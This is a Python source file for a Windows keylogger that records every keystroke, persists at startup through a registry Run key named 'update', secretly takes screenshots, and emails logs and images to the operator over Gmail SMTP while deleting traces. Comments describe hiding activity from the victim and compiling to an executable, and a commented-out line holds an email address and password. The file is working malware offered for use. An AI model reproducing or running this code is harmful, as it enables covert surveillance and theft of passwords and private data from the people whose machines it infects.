import pynput.keyboard
import threading
from email.message import EmailMessage
import imghdr
import smtplib
from mss import mss
import os


# this programme can be complied into an .exe with pyinstaller


class Key_loger:
    # we have to use multythreading cz have 2 methodes that will take all our programme ( he will be stuck inside it ) and these methodes need to run in parallel at the same time

    def __init__(self, interval, email, password):
        self.log = "The keyloger has started his job *-*"
        self.interval = interval
        self.email = email
        self.email_password = password

    # this fct will make our keyloger start when the computer starts

    def presistent(self):
        # keyloger.py c'est le nom du fichier du  keyloger
        keyloger_location = os.environ["appdata"] + "\\keyloger.py"
        if not os.path.exists(keyloger_location):
            os.system("copy keyloger.py " + os.environ["appdata"])
            os.system(
                'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+keyloger_location+'"')

    def key_press_listener(self, key):
        # this fct will record all what i type on the log var
        try:
            self.log += str(key.char)
        except AttributeError:
            # because we used key.char to have a nice output some keyboard keys like backspace won't be printed because it's a key like 'a' or 'b' so we have to do this try except to solve that problem it will also prevent our programme from crashing if a problem happens

            # if we use press the space bare it will recorded as Key.space so to make our logs more readable we will change that Key.space by an " " ( a real space )
            if str(key) == "Key.space":
                self.log += " "
            # elif str(key) == "Key.backspace":
            #     self.log += ""
            # you can uncomment this if u don't want to see the backspace in the logs
            else:
                self.log += " " + str(key) + " "

    def report(self):
        # this fct will send all what was record on the log var every x second (the interval x can be set to the value u want )
        try:
            # when we get back our connection to the internet we send what was saved on the log file and then we del the logs
            if os.path.exists("./logs.txt"):
                data = open("logs.txt", "r")
                self.log += data.read()
                data.close()
                os.system("del logs.txt")
            self.send_repport(self.email, self.email_password,
                              self.log)
        except Exception:
            self.log_in_file()

        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


# we will send a report ( the logs ) as an e-mail + a screen shot of the full screen of that computer


    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
                # we mouve the img there so he can't see that we took a screenshot of his screen
                os.system("move monitor-1.png " + os.environ["appdata"])
        except Exception:
            pass
        # i don't really have much to do here since will send an error msg in the e-mail
        # i have to do a try except cz if there is a problem when taking the screenshot i don't want the programme to crash

    def log_in_file(self):
        # change the name log.txt mrga
        with open("logs.txt", "a") as log_file:
            log_file.write(
                f"the computer lost internet connection\n {self.log}\n -------------------------------------------\n")

    def send_repport(self, email, password, content, img=os.environ["appdata"]+"\\monitor-1.png"):
        newMessage = EmailMessage()
        newMessage['Subject'] = "key loger logs"
        newMessage['From'] = email
        newMessage['To'] = email
        newMessage.set_content(content)

        try:
            self.screenshot()
            with open(img, 'rb') as img:
                image_data = img.read()
                image_type = imghdr.what(img.name)
                image_name = img.name

            newMessage.add_attachment(image_data, maintype='image',
                                      subtype=image_type, filename=image_name)
            # we del the screen shot after we send it to rm all traces
            os.system("del "+os.environ["appdata"]+"\monitor-1.png")
        except Exception:
            newMessage.set_content(
                content+"\n could not take a screen shot :(")

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(email, password)
            smtp.send_message(newMessage)

    def run(self):
        self.presistent()
        Keyboard_listener = pynput.keyboard.Listener(
            on_press=self.key_press_listener)

        with Keyboard_listener:
            self.report()
            Keyboard_listener.join()


# keyloger = Key_loger(5, "sinchallange@gmail.com", "ri@d123456789")
# keyloger.run()
